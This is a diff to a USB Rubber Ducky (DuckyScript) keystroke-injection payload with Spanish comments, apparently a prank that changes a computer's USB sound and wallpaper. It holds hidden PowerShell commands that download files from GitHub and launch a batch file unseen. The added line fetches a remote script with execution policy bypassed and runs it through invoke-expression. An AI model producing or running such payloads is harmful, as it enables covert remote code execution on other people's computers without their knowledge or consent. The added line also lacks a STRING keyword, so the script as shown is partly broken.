@@ -8,3 +8,5 @@ DELAY 300
 REM Abre PowerShell en modo oculto para descargar los archivos y ejecutar el .bat
 STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/garcia95alberto/sound-effect-joke/blob/ba870cb9b6e2eb567379bf4f5035fd32822eeb66/setup.bat' -OutFile $env:TEMP\setup.bat; Invoke-WebRequest -Uri 'https://github.com/garcia95alberto/sound-effect-joke/blob/2cf9c5a062abdacebf500a657043fb67bd50b9ad/usb-sound.ps1' -OutFile $env:TEMP\changeSound.ps1; Invoke-WebRequest -Uri 'https://github.com/garcia95alberto/sound-effect-joke/blob/2cf9c5a062abdacebf500a657043fb67bd50b9ad/fart.wav -OutFile $env:APPDATA\Microsoft\Windows\Media\usb_sound.wav; Start-Process -FilePath $env:TEMP\setup.bat -WindowStyle Hidden"
 ENTER
+
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/garcia95alberto/Wallper_vox/refs/heads/main/cambiar_fondo.ps1; invoke-expression $pl
